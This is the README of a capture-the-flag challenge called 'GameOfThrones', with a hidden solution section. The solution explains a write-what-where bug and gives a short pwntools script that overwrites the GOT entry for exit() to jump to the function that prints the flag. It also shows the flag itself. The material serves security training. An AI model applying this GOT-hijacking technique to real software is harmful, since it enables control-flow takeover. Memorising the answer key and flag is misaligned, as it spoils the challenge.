# GameOfThrones

### 📄 Description

Can you write a decent finale for Game of Thrones and get the flag?

### ⚙ How to run
```bash
./vuln
```


### ⛔ Rules
- You cannot patch this binary.
- The challenge MUST BE SOLVED by providing appropriate inputs.
- Solutions that jump directly to the print flag function WILL NOT BE CONSIDERED.
- Do not modify the `flag.txt` file.


<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>


The binary provides a trivial write-what-where so it would be a good idea to overwrite some entry in the GOT in order to get control of the program control flow.
A good candidate for the overwrite would be (as usual) the `exit()` function.
The function that gives us the flag is `show_true_ending()` but it's never called anywhere.
By overwriting the GOT entry for `exit()` we can call the required function and get the flag.

```python
from pwn import * 

context.binary = "./vuln"
e: ELF = context.binary  
p = process()
p.sendline(str(e.got["exit"]).encode("ascii"))
p.sendline(str(e.functions["show_true_ending"].address).encode("ascii"))
log.success(p.recvline_regex(rb"SPRITZ{.*}").decode("ascii"))
```

<h3> 🚩 Flag </h3>

```plain
SPRITZ{GoT_Hijacking_iS_FUn{flag}}
```
</details>
